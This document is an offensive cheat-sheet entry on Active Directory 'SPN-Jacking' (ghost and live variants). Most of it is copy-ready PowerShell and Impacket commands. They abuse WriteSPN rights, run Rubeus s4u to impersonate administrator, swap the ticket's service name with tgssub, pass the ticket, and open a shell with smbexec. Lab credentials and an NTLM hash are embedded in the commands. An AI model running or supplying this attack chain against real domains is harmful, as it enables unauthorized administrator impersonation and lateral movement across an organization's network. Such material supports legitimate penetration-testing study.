# 11.07 SPN Jacking Ghost Live

> Abuse WriteSPN to add an orphaned (ghost) or live SPN to a target machine, S4U-impersonate, then `Rubeus tgssub` to swap service names.

## Overview

SPN Jacking abuses WriteSPN rights to redirect Constrained Delegation SPNs to a target machine rather than cracking passwords. Ghost SPN-Jacking uses an orphaned (deleted/renamed account) SPN — adding it to the target machine enables S4U impersonation. Live SPN-Jacking clears a live SPN from its current owner first, assigns it to the target, performs S4U, then restores. In both cases the resulting ticket names the wrong host/service, so Rubeus tgssub or tgssub.py is used to substitute the service name before using the ticket.

## Steps

- Enumerate WriteSPN rights with PowerView Get-DomainComputer | Get-DomainObjectAcl or BloodHound cypher query MATCH p=(n:User)-[r1:WriteSPN*1..]->(c:Computer) RETURN p.
- Confirm Constrained Delegation with Get-DomainComputer -TrustedToAuth and Get-ConstrainedDelegation.
- Ghost: find orphaned SPNs with Get-ConstrainedDelegation -CheckOrphaned; assign orphan to target with Set-DomainObject -Set serviceprincipalname.
- Live: note then clear live SPNs from the source machine with Set-DomainObject -Clear serviceprincipalname (Windows) or addspn.py --clear (Linux); add to target; restore afterwards.
- Run Rubeus s4u /msdsspn:<ghost/live SPN> /impersonateuser:administrator to get a service ticket for the target host.
- Use Rubeus tgssub /altservice:cifs/WEB01 (or tgssub.py -altservice) to substitute the service name in the ticket.
- Import ticket with Rubeus ptt and access target (ls \\web01\c$, Enter-PSSession, smbexec.py).
- Linux: use findDelegation.py via proxychains to enumerate delegation; addspn.py for SPN manipulation; getST.py with -altservice for single-command approach; KRB5CCNAME=newticket.ccache smbexec.py for shell.

## Commands

### Enumerate WriteSPN (PowerView)

```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID gabriel)}
```

### Check Constrained Delegation + AllowedToDelegate

```powershell
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
```

### List delegation with Get-ConstrainedDelegation

```powershell
Import-Module C:\Tools\PowerView.ps1; Import-Module C:\Tools\Get-ConstrainedDelegation.ps1; Get-ConstrainedDelegation
```

### Find orphaned SPNs

```powershell
Get-ConstrainedDelegation -CheckOrphaned
```

### Assign orphaned/live SPN to target (Ghost)

```powershell
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dhcp/DATABASE01'} -Verbose
```

### S4U attack with Rubeus (Ghost SPN)

```powershell
.\Rubeus.exe s4u /domain:<DOMAIN>.local /user:SRV01$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dhcp/DATABASE01" /nowrap
```

### Substitute service name in ticket (Windows)

```powershell
.\Rubeus.exe tgssub /ticket:<SNIP> /altservice:cifs/WEB01 /nowrap
```

### Import substituted ticket

```powershell
.\Rubeus.exe ptt /ticket:doIGpjCCBqKgAwIBBaEDAgEWooIFsTCCBa1h<SNIP>
```

### Clear live SPNs from source (Windows)

```powershell
Set-DomainObject -Identity DBSRV003 -Clear 'serviceprincipalname' -Verbose
```

### Assign live SPN to target (Live SPN-Jacking)

```powershell
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dmserver/DBSRV003'} -Verbose
```

### S4U attack with Rubeus (Live SPN)

```powershell
.\Rubeus.exe s4u /domain:<DOMAIN>.local /user:SRV01$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dmserver/DBSRV003" /nowrap
```

### Substitute HTTP service + Enter-PSSession

```powershell
.\Rubeus.exe tgssub /ticket:doIGtDCCBrCgAwIBBaEDAgEWooIF<SNIP> /altservice:HTTP/WEB01 /nowrap
```

### Find delegation (Linux via proxychains)

```bash
proxychains4 -q findDelegation.py -target-domain <DOMAIN>.local -dc-ip 172.16.92.10 -dc-host dc02 <DOMAIN>.local/gabriel:Godisgood001
```

### Clear SPNs from source machine (Linux)

```bash
proxychains4 -q python3 addspn.py 172.16.92.10 -u '<DOMAIN>.local\gabriel' -p Godisgood001 --clear -t 'DBSRV003$' -dc-ip 172.16.92.10
```

### Add SPN to target machine (Linux)

```bash
proxychains4 -q python3 addspn.py 172.16.92.10 -u '<DOMAIN>.local\gabriel' -p Godisgood001 --spn 'dmserver/DBSRV003' -t 'WEB01$' -dc-ip 172.16.92.10
```

### S4U getST (Linux)

```bash
proxychains4 -q getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator '<DOMAIN>.local/SRV01$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip 172.16.92.10
```

### Single-command getST with altservice (updated Impacket)

```bash
proxychains4 -q getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator '<DOMAIN>.local/SRV01$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip 172.16.92.10 -altservice "cifs/WEB01.<DOMAIN>.local"
```

### Inspect ticket details

```bash
describeTicket.py Administrator@[email protected]
```

### Substitute service name (Linux tgssub.py)

```bash
proxychains4 -q python3 tgssub/examples/tgssub.py -in Administrator@[email protected] -altservice "cifs/WEB01" -out newticket.ccache
```

### Use ticket for shell (Linux)

```bash
KRB5CCNAME=newticket.ccache proxychains4 -q smbexec.py -k -no-pass WEB01
```

### Restore cleared SPNs (Linux loop)

```bash
for spn in $(cat DBSRV003spns.txt);do proxychains4 -q python3 addspn.py 172.16.92.10 -u '<DOMAIN>.local\gabriel' -p Godisgood001 -t 'DBSRV003$' --spn $spn;done
```
